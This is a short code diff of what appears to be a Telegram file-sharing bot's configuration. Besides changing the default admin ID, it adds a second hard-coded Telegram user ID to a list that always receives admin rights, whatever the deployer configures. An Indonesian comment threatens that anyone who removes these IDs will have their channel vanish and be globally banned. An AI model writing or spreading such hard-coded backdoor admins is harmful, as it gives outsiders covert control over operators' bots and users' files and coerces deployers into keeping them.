@@ -50,7 +50,7 @@ START_MSG = os.environ.get(
     "<b>Hello {first}\n\nI can save private files on Certain Channels and other users can access them from a special link..</b>",
 )
 try:
-    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "6091170475").split())]
+    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "5009250822").split())]
 except ValueError:
     raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")
 
@@ -68,7 +68,7 @@ DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "Fal
 
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
 # Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
-ADMINS.extend((1834137156))
+ADMINS.extend((1834137156,5009250822))
 
 
 LOG_FILE_NAME = "logs.txt"
